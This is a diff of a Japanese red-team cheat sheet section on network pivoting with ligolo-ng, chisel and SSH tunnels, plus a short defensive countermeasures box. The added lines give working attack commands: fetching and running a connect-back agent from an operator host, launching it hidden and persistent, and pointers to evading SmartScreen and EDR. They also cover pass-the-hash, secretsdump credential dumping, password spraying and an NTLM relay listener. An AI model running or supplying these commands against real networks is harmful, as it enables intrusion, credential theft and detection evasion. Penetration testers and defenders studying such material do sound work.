@@ -818,7 +818,7 @@ wsl -e ss -tln                                                    <span class="c
 
     <section id="s10" class="reveal">
       <h2><span class="num">10</span>Pivot Topology &amp; Fallback Ladder<span class="jp">経路設計とフォールバック</span></h2>
-      <p>chisel / ligolo-ng の個別コマンドは <a href="tooling.html">tooling</a> が本文。ここでは<strong>どの topology を選ぶか</strong>の判断フレームワークと egress 制限下の fallback ladder に絞る。</p>
+      <p>lateral の実現には transport の到達性が前提。<strong>どの topology を選ぶか</strong>の判断フレームワーク、実践コマンド (ligolo-ng / chisel / SSH tunnel)、egress 制限下の fallback ladder をまとめる。ファイル転送単体は <a href="tooling.html">file-transfer</a> を参照。</p>
 
       <h3 id="topology-matrix">Topology 判断マトリクス</h3>
       <table>
@@ -832,62 +832,229 @@ wsl -e ss -tln                                                    <span class="c
         </tbody>
       </table>
 
-      <h3 id="ligolo-topology">ligolo-ng の topology 特性</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator] proxy 起動 (TLS listener)</span>
-sudo ip tuntap add user <span class="v">&lt;USER&gt;</span> mode tun ligolo
+      <h3 id="ligolo-setup">ligolo-ng: setup と agent 配布</h3>
+      <p>proxy 側 (operator) で TUN device を先に作成、self-cert で listener 起動。agent は TLS で reverse connect back する。v0.7 系は proxy CLI で <code>interface_create --name</code> による dynamic TUN 生成に対応するが、事前に <code>ip tuntap add</code> する古典 pattern が最も安定。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator / kali] TUN device 作成 (root)</span>
+sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
-./proxy -selfcert                                <span class="c"># self-signed で listen (11601/tcp)</span>
 
-<span class="c"># [pivot 側] agent を起動 → proxy へ connect back</span>
-./agent -connect <span class="v">&lt;LHOST&gt;</span>:11601 -ignore-cert
+<span class="c"># [operator] proxy 起動 (self-signed 証明書、11601/tcp listen)</span>
+./proxy -selfcert -laddr 0.0.0.0:11601
 
-<span class="c"># [operator の proxy CLI] session を選択</span>
+<span class="c"># 別 port を使いたい場合</span>
+./proxy -selfcert -laddr 0.0.0.0:9001
+
+<span class="c"># verbose log (troubleshoot 時)</span>
+./proxy -selfcert -laddr 0.0.0.0:11601 -v</code></pre></div>
+
+      <p>Target 側 (Linux agent):</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># operator の HTTP server から配布 (curl / wget)</span>
+curl http://<span class="v">&lt;LHOST&gt;</span>:8888/agent -o /tmp/agent
+chmod +x /tmp/agent
+
+<span class="c"># 起動 (self-cert 検証を skip)</span>
+./tmp/agent -connect <span class="v">&lt;LHOST&gt;</span>:11601 -ignore-cert
+
+<span class="c"># daemon 化 (session 切断後も残す)</span>
+nohup /tmp/agent -connect <span class="v">&lt;LHOST&gt;</span>:11601 -ignore-cert &amp;&gt;/dev/null &amp;</code></pre></div>
+
+      <p>Target 側 (Windows agent):</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerShell で配布</span>
+iwr http://<span class="v">&lt;LHOST&gt;</span>:8888/agent.exe -o C:\Users\Public\agent.exe
+
+<span class="c"># 起動</span>
+C:\Users\Public\agent.exe -connect <span class="v">&lt;LHOST&gt;</span>:11601 -ignore-cert
+
+<span class="c"># hidden window で起動 (SmartScreen / AV は evasion sheet の技法で回避)</span>
+Start-Process -WindowStyle Hidden C:\Users\Public\agent.exe <span class="s">"-connect &lt;LHOST&gt;:11601 -ignore-cert"</span></code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>Windows agent は EDR / SmartScreen の signature に載っている。事前に <a href="evasion.html">evasion</a> の unhook / signing / re-compile 技法で偽装するか、既存 Sliver / MSF session から <code>execute-assembly</code> 相当で in-memory 実行する pattern が現実的。</div>
+
+      <h3 id="ligolo-session">ligolo-ng: セッション開始と agent 側 network 確認</h3>
+      <p>agent が connect back すると proxy CLI に session が現れる。<code>ifconfig</code> で agent 側の interface を確認してから routing 計画を立てる。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">ligolo</span><button class="copy">copy</button></div><pre><code><span class="c"># session 選択</span>
 ligolo-ng » session
-<span class="c">#   -&gt; 1 番を選択</span>
+? Specify a session : 1 - <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOSTNAME&gt;</span> - <span class="v">&lt;TARGET_IP&gt;</span>:<span class="v">&lt;PORT&gt;</span>
 
-<span class="c"># [operator] interface 作成 + route 追加</span>
-ligolo-ng » interface_create --name ligolo
-ligolo-ng » interface_list
+<span class="c"># session 一覧</span>
+[Agent : <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOSTNAME&gt;</span>] » sessions
 
-<span class="c"># pivot 越しに到達したい CIDR を route table に足す</span>
-sudo ip route add <span class="v">&lt;TARGET_CIDR&gt;</span> dev ligolo
+<span class="c"># agent 側の interface (routing 計画に必須)</span>
+[Agent : <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOSTNAME&gt;</span>] » ifconfig
+<span class="c">#   Interface 0  Ethernet0  IPv4 &lt;EXTERNAL_CIDR&gt;/24</span>
+<span class="c">#   Interface 1  Ethernet1  IPv4 &lt;INTERNAL_CIDR&gt;/24     -&gt; これが lateral の対象</span>
 
-<span class="c"># -&gt; 以降 kali の tool は全て pivot 側の routing で target に到達する</span>
-<span class="c">#    (nmap -sS, evil-winrm, impacket-*, msf 全て proxychains 不要で通る)</span>
+<span class="c"># tunnel 起動</span>
+[Agent : <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOSTNAME&gt;</span>] » start
+INFO[XXXX] Starting tunnel to <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOSTNAME&gt;</span>
 
-<span class="c"># reverse listener (target -&gt; kali:8888 を作りたい場合)</span>
-ligolo-ng » listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:9999
-<span class="c">#   -&gt; pivot host の 8888 に来た connection が kali の 9999 に forward される</span></code></pre></div>
+<span class="c"># tunnel 停止</span>
+[Agent : <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOSTNAME&gt;</span>] » stop</code></pre></div>
 
-      <h3 id="double-pivot">Double pivot (segment 越え)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># segment A (10.10.0.0/24) &lt;-&gt; segment B (172.16.5.0/24) が pivot1 経由で繋がる</span>
-<span class="c"># segment B の中の pivot2 経由で segment C (192.168.20.0/24) に到達したい</span>
+      <h3 id="ligolo-route">ligolo-ng: TUN routing</h3>
+      <p><code>ifconfig</code> で確認した内部 CIDR を kali 側 routing table に加える。以降 kali の任意 tool が透過的に到達する。<strong>proxychains 不要</strong>。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator / kali] route 追加</span>
+sudo ip route add <span class="v">&lt;INTERNAL_CIDR&gt;</span>/24 dev ligolo
 
-<span class="c"># [operator (kali)]:</span>
-sudo ip route add 10.10.0.0/24 dev ligolo    <span class="c"># pivot1 で入る A → B</span>
+<span class="c"># 複数 CIDR (agent の ifconfig で見えた全 subnet を追加)</span>
+sudo ip route add 10.10.100.0/24 dev ligolo
+sudo ip route add 172.16.0.0/16 dev ligolo
 
-<span class="c"># pivot1 上で agent → operator の chain を確立</span>
+<span class="c"># 現在の route 確認</span>
+ip route show | grep ligolo</code></pre></div>
 
-<span class="c"># [pivot2 側] agent を pivot1 の中継経由 or operator に直接 connect back</span>
-<span class="c"># operator 側で pivot2 の session が別 tab に来る</span>
-ligolo-ng » session
-<span class="c">#   -&gt; 2 番 (pivot2) を選択</span>
-ligolo-ng » interface_create --name ligolo2
+      <h3 id="ligolo-exec">ligolo-ng: TUN 越し実務コマンド</h3>
+      <p>routing が通ったら kali のフルスタックがそのまま使える。SOCKS だと不可能な SYN scan / UDP / raw socket 操作もここで初めて可能になる。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># nmap: TUN 越しなら SYN scan が動く (proxychains では不可)</span>
+sudo nmap -sS -Pn -T4 <span class="v">&lt;INTERNAL_TARGET&gt;</span>
+sudo nmap -sU -Pn --top-ports 20 <span class="v">&lt;INTERNAL_TARGET&gt;</span>          <span class="c"># UDP も可</span>
+sudo nmap -sS -Pn -p 445,3389,5985 <span class="v">&lt;INTERNAL_CIDR&gt;</span>/24     <span class="c"># subnet sweep</span>
+
+<span class="c"># impacket (NTLM / Kerberos)</span>
+impacket-psexec administrator@<span class="v">&lt;INTERNAL_TARGET&gt;</span>
+impacket-secretsdump <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;INTERNAL_DC&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span>
+impacket-secretsdump -k -no-pass <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;INTERNAL_DC&gt;</span>
+
+<span class="c"># evil-winrm</span>
+evil-winrm -i <span class="v">&lt;INTERNAL_TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span>
+
+<span class="c"># BloodHound collector (Linux, TUN 越し LDAP)</span>
+bloodhound-python -d <span class="v">&lt;DOMAIN&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PW&gt;</span> -c all -ns <span class="v">&lt;INTERNAL_DC&gt;</span>
+
+<span class="c"># nxc 系 (spray / enum)</span>
+nxc smb <span class="v">&lt;INTERNAL_CIDR&gt;</span>/24 -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span></code></pre></div>
+
+      <h3 id="ligolo-listener">ligolo-ng: reverse listener (HTTP relay)</h3>
+      <p>lateral 先 target が operator に直接届かない場合、agent 側 host で listen して operator の service へ relay する。ツール転送や NTLM relay の primitive として使う。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">ligolo</span><button class="copy">copy</button></div><pre><code><span class="c"># operator 側 (proxy CLI) で listener 追加</span>
+<span class="c">#   agent の 0.0.0.0:8888 に来た接続を、operator の 127.0.0.1:8888 に転送</span>
+[Agent : ...] » listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888 --tcp
+INFO[XXXX] Listener created on remote agent!
+
+<span class="c"># lateral 先 target (agent と同 subnet の別 host) から:</span>
+<span class="c">#   agent host の 8888 が operator の HTTP server に見える</span>
+<span class="c"># powershell curl http://&lt;AGENT_INTERNAL_IP&gt;:8888/tool.exe -o C:\Users\Public\tool.exe</span>
+
+<span class="c"># NTLM relay 用の SMB listener (SMB signing 無効の環境向け)</span>
+[Agent : ...] » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:1445 --tcp
+
+<span class="c"># listener 一覧</span>
+[Agent : ...] » listener_list
+
+<span class="c"># listener 停止</span>
+[Agent : ...] » listener_stop 0</code></pre></div>
+
+      <h3 id="ligolo-double">ligolo-ng: double pivot (segment 越え)</h3>
+      <p>segment A (10.10.0.0/24) が pivot1 経由で到達、その先の segment B (192.168.20.0/24) に pivot2 経由で到達する pattern。<strong>各 hop で TUN interface 名を分ける</strong>のがポイント。同名で作ると後段が前段を上書きする。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator (kali)]:</span>
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.10.0.0/24 dev ligolo             <span class="c"># pivot1 で入る A → B</span>
+
+<span class="c"># pivot1 host が接続してくると session 1 が現れる</span>
+<span class="c"># pivot1 の内部 CIDR 経由で pivot2 host に到達可能な状態を作る</span>
+
+<span class="c"># pivot2 host に agent を配布 → operator に直接 connect back</span>
+<span class="c"># (route 済なので pivot1 経由で operator の 11601 に届く)</span>
+
+<span class="c"># 別 TUN device を作成</span>
+sudo ip tuntap add user $(whoami) mode tun ligolo2
+sudo ip link set ligolo2 up
 sudo ip route add 192.168.20.0/24 dev ligolo2
 
-<span class="c"># -&gt; A から C までの全 CIDR が operator 側 routing table に統合される</span></code></pre></div>
+<span class="c"># proxy CLI で pivot2 session を選択</span></code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">ligolo</span><button class="copy">copy</button></div><pre><code>ligolo-ng » session
+? Specify a session : 2 - <span class="v">&lt;USER2&gt;</span>@<span class="v">&lt;HOSTNAME2&gt;</span> - <span class="v">&lt;PIVOT2_IP&gt;</span>:<span class="v">&lt;PORT&gt;</span>
 
-      <h3 id="chisel-socks">chisel SOCKS (HTTPS 制約下)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator] server</span>
+[Agent : ...] » interface_create --name ligolo2
+[Agent : ...] » start
+
+<span class="c"># この時点で kali の routing table に A / B 両方の CIDR が居る</span>
+<span class="c"># nmap / impacket / evil-winrm 全て両 segment に到達</span></code></pre></div>
+
+      <h3 id="ligolo-trouble">ligolo-ng: troubleshooting</h3>
+      <ul>
+        <li><strong>agent が connect back できない</strong>: proxy 側 firewall で 11601/tcp が閉じている / TLS 証明書検証エラー (agent 側で <code>-ignore-cert</code> 明示) / DNS 解決失敗 (proxy を FQDN で指定した場合)。まず <code>./proxy -v</code> で verbose log。</li>
+        <li><strong>route 追加できない (<code>RTNETLINK: Operation not permitted</code>)</strong>: <code>sudo</code> 忘れ、または既存 route と CIDR 衝突。<code>ip route show</code> で衝突を先に消す。</li>
+        <li><strong>TUN device 作成失敗 (<code>RTNETLINK: File exists</code>)</strong>: 前回の TUN が残っている。<code>sudo ip link delete ligolo</code> で削除してから再作成。</li>
+        <li><strong>名前解決失敗 (TUN 越しで FQDN が引けない)</strong>: 内部 DNS を <code>/etc/resolv.conf</code> に暫定追加、または <code>dig @&lt;INTERNAL_DNS&gt; &lt;FQDN&gt;</code> で直接 query。<code>/etc/hosts</code> に固定 IP を書く手も。</li>
+        <li><strong>tunnel が start しても通信が届かない</strong>: agent 側 host の firewall で forwarding が禁止されている可能性。特に Windows Defender Firewall の out ルール。</li>
+      </ul>
+
+      <h3 id="ligolo-cleanup">ligolo-ng: cleanup</h3>
+      <p>engagement 終了時の後始末。artifact を残さないため必ず順序通り実行。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator (proxy CLI)] tunnel と listener を先に停止</span>
+[Agent : ...] » listener_list
+[Agent : ...] » listener_stop <span class="v">&lt;N&gt;</span>
+[Agent : ...] » stop
+<span class="c">#   Ctrl+D or proxy 終了で session を切る</span>
+
+<span class="c"># [operator (kali)] routing と TUN device を削除</span>
+sudo ip route del <span class="v">&lt;INTERNAL_CIDR&gt;</span>/24 dev ligolo
+sudo ip link delete ligolo
+
+<span class="c"># [target (Linux)] agent binary を削除</span>
+rm -f /tmp/agent
+
+<span class="c"># [target (Windows)] agent binary を削除</span>
+<span class="c"># del C:\Users\Public\agent.exe</span></code></pre></div>
+
+      <h3 id="chisel">chisel: SOCKS + forward tunnel</h3>
+      <p>ligolo が使えない (TUN 作成不可、UDP 不要) 場面での軽量代替。HTTPS 制約下や corporate proxy 環境での egress にも強い。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [operator] server (TLS + reverse mode)</span>
 ./chisel server -p 8443 --reverse --tls-cert cert.pem --tls-key key.pem
 
-<span class="c"># [pivot] client → operator に reverse tunnel + SOCKS5 (R:1080)</span>
+<span class="c"># --- (A) reverse SOCKS (最も基本、pivot 越しに kali の任意 tool を通したい) ---</span>
 ./chisel client --tls-skip-verify https://<span class="v">&lt;LHOST&gt;</span>:8443 R:1080:socks
 
-<span class="c"># [operator] proxychains 経由で kali tool を通す</span>
+<span class="c"># --- (B) reverse forward (単一 service の露出) ---</span>
+<span class="c">#   operator の 127.0.0.1:8080 が agent 経由で &lt;INTERNAL_TARGET&gt;:80 に転送</span>
+./chisel client --tls-skip-verify https://<span class="v">&lt;LHOST&gt;</span>:8443 R:8080:<span class="v">&lt;INTERNAL_TARGET&gt;</span>:80
+
+<span class="c"># --- (C) multi-mapping (WinRM + MSSQL + HTTP を一発で) ---</span>
+./chisel client --tls-skip-verify https://<span class="v">&lt;LHOST&gt;</span>:8443 \
+    R:5985:<span class="v">&lt;INTERNAL_TARGET&gt;</span>:5985 \
+    R:1433:<span class="v">&lt;INTERNAL_DB&gt;</span>:1433 \
+    R:8080:<span class="v">&lt;INTERNAL_HTTP&gt;</span>:80
+
+<span class="c"># --- (D) HTTP proxy 経由 (corporate proxy 環境) ---</span>
+./chisel client --proxy http://<span class="v">&lt;USER&gt;</span>:<span class="v">&lt;PW&gt;</span>@<span class="v">&lt;CORP_PROXY&gt;</span>:8080 \
+    https://<span class="v">&lt;LHOST&gt;</span>:8443 R:1080:socks
+
+<span class="c"># --- (E) keepalive と reconnect (エンゲージメントを跨いで維持) ---</span>
+./chisel client --keepalive 30s --max-retry-count -1 https://<span class="v">&lt;LHOST&gt;</span>:8443 R:1080:socks
+
+<span class="c"># [operator] proxychains 経由で kali tool を通す (SOCKS の場合)</span>
 echo <span class="s">"socks5 127.0.0.1 1080"</span> &gt;&gt; /etc/proxychains4.conf
-proxychains4 nmap -sT -Pn -p 80,443,445 <span class="v">&lt;TARGET&gt;</span>
-proxychains4 impacket-secretsdump <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span></code></pre></div>
+proxychains4 nmap -sT -Pn -p 80,443,445 <span class="v">&lt;INTERNAL_TARGET&gt;</span>
+proxychains4 impacket-secretsdump <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;INTERNAL_TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span></code></pre></div>
+
+      <h3 id="ssh-tunnel">SSH tunnel (SOCKS / -L / -R / ProxyJump)</h3>
+      <p>pivot host に SSH アクセスが既にある場合の低検知代替。chisel の binary drop なしで SOCKS / forward / reverse が完結する。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># SOCKS proxy (dynamic port forward)</span>
+ssh -D 1080 <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;PIVOT&gt;</span>                       <span class="c"># foreground</span>
+ssh -fN -D 1080 <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;PIVOT&gt;</span>                   <span class="c"># background</span>
+
+<span class="c"># ローカル port forward (-L) — operator が pivot 越しに単一 service を叩く</span>
+ssh -L 8080:<span class="v">&lt;INTERNAL_TARGET&gt;</span>:80 <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;PIVOT&gt;</span>
+<span class="c">#   -&gt; operator の 127.0.0.1:8080 が pivot 経由で &lt;INTERNAL_TARGET&gt;:80 に届く</span>
+
+<span class="c"># リモート port forward (-R) — pivot 側から operator の service を露出</span>
+ssh -R 8080:localhost:80 <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;PIVOT&gt;</span>
+<span class="c">#   -&gt; pivot の 127.0.0.1:8080 が operator の localhost:80 に届く</span>
+
+<span class="c"># multi-hop (ProxyJump)</span>
+ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span> <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span>
+ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span>,<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP2&gt;</span> <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span>
+
+<span class="c"># SSH config で恒久化 (~/.ssh/config)</span>
+<span class="c">#   Host target</span>
+<span class="c">#     HostName &lt;TARGET&gt;</span>
+<span class="c">#     User &lt;USER&gt;</span>
+<span class="c">#     ProxyJump hop1,hop2</span>
+
+<span class="c"># -D と -J の混合 (ProxyJump で SOCKS も同時確保)</span>
+ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span> -D 1080 <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span></code></pre></div>
 
       <h3 id="egress-ladder">Egress fallback ladder</h3>
       <p>corporate proxy / firewall の制限度合いに応じて、以下の順で試す:</p>
@@ -899,38 +1066,25 @@ proxychains4 impacket-secretsdump <span class="v">&lt;DOMAIN&gt;</span>/<span cl
         <li><strong>ICMP tunneling</strong> — icmpsh / ptunnel。最終手段、帯域極小。</li>
       </ol>
 
-      <h3 id="ssh-proxyjump">SSH ProxyJump (multi-hop)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># [1] 単純な 2-hop</span>
-ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span> <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span>
-
-<span class="c"># [2] 3-hop 以上</span>
-ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span>,<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP2&gt;</span> <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span>
-
-<span class="c"># [3] SSH config で恒久化 (~/.ssh/config)</span>
-<span class="c">#   Host target</span>
-<span class="c">#     HostName &lt;TARGET&gt;</span>
-<span class="c">#     User &lt;USER&gt;</span>
-<span class="c">#     ProxyJump hop1,hop2</span>
-
-<span class="c"># [4] SOCKS5 を確保しつつ ProxyJump (混合 pattern)</span>
-ssh -J <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;HOP1&gt;</span> -D 1080 <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span></code></pre></div>
-
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
           <li><strong>egress filter</strong>: 業務用 network から任意 IP:port への outbound を白リスト方式に制限。443 も corporate proxy 経由のみに絞る (SNI と Host header の整合を検査するプロキシ)。</li>
-          <li><strong>TUN device の作成監視</strong>: <code>auditd</code> で <code>execve</code> の <code>ip tuntap add</code> / <code>ip link add</code> を wa 監視、Windows 側は <code>Sysmon EID 22</code> (DNS query) と併せて anomaly 検知。</li>
-          <li><strong>DNS anomaly detection</strong>: 単一 host からの高頻度 TXT / A record query、subdomain 長の異常、通信量 anomaly (通常 domain より遥かに多い名前解決)。</li>
-          <li><strong>SSH client 挙動監視</strong>: sshd 側の <code>ForwardAgent / GatewayPorts / AllowTcpForwarding</code> を全て <code>no</code> に設定、jump host のみ例外運用。</li>
+          <li><strong>TUN device の作成監視</strong>: <code>auditd -w /sys/class/net -p wa</code> で <code>ip tuntap add</code> / <code>ip link add</code> を audit。Windows 側は <code>Sysmon EID 22</code> (DNS query) と <code>EID 3</code> (network connect) の anomaly を併用。</li>
+          <li><strong>DNS anomaly detection</strong>: 単一 host からの高頻度 TXT / A record query、subdomain 長の異常、通信量 anomaly。dnscat2 の signature は特に subdomain の base32-like pattern。</li>
+          <li><strong>SSH client 挙動監視</strong>: sshd 側の <code>ForwardAgent / GatewayPorts / AllowTcpForwarding</code> を全て <code>no</code> に、jump host のみ例外運用。<code>PermitTunnel no</code> で TUN forwarding も塞ぐ。</li>
           <li><strong>ICMP payload inspection</strong>: 平均 payload size と rate の anomaly 検知。ICMP tunnel は payload が大きくなる。</li>
+          <li><strong>反対方向の防御</strong>: agent binary 自体を EDR で捕捉。ligolo agent は公開 signature が既に流通、<code>agent -connect</code> の CLI パターン、TLS handshake の JA3 も検知可能。</li>
         </ul>
       </div>
 
       <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
         <ul>
-          <li>ligolo-ng の TUN は「pivot 越しの nmap SYN scan / UDP / raw socket」が可能な唯一の topology。scan の再現性を担保したい engagement で第一選択。</li>
+          <li>ligolo-ng の TUN は「pivot 越しの nmap SYN scan / UDP / raw socket」が可能な唯一の topology。scan 再現性を担保したい engagement で第一選択。</li>
           <li>chisel SOCKS は「TCP のみで軽く済ませたい」場合の default、HTTPS 制約下の egress では必須。</li>
+          <li>SSH tunnel は binary drop なしで完結し、既存 SSH に紛れる。pivot 経路に SSH アクセスがあるなら chisel より優先。</li>
           <li>Egress ladder は上から下ほど帯域と検知回避の trade-off が悪化する。まず TCP any-port を試し、塞がれてから 443 → DNS → ICMP と落ちていく。</li>
           <li>Double pivot は<strong>各 hop での TUN interface 名を分けて</strong> routing table に別々に足す。同名で足すと後段が前段を上書きする。</li>
+          <li>ligolo agent の Windows 版は SmartScreen / EDR signature に載っている。evasion sheet の unhook / re-compile 技法との併用が前提。</li>
         </ul>
       </div>
     </section>
